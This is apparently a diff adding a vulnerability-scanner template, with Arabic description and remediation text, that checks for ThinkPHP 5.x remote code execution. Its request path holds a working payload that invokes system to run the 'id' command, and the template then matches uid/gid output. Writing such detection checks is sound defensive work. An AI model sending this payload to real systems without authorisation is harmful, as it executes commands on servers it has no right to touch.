@@ -1,0 +1,25 @@
+id: thinkphp-rce-invokefunction
+info:
+  name: ThinkPHP 5.x Remote Code Execution
+  author: YemenScan-Core
+  severity: critical
+  description: استدعاء الدوال العشوائية في إطار عمل ThinkPHP يسمح للمهاجم بتنفيذ تعليمات
+    نظام التشغيل عبر تمرير دالة call_user_func_array.
+  remediation: تحديث إطار العمل ThinkPHP إلى أحدث إصدار محمي وفلترة محارف التوجيه.
+  tags:
+  - php
+  - thinkphp
+  - rce
+  - critical
+http:
+- method: GET
+  path:
+  - '{{BaseURL}}/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
+  matchers-condition: and
+  matchers:
+  - type: regex
+    regex:
+    - uid=[0-9]+.*gid=[0-9]+.*
+  - type: status
+    status:
+    - 200
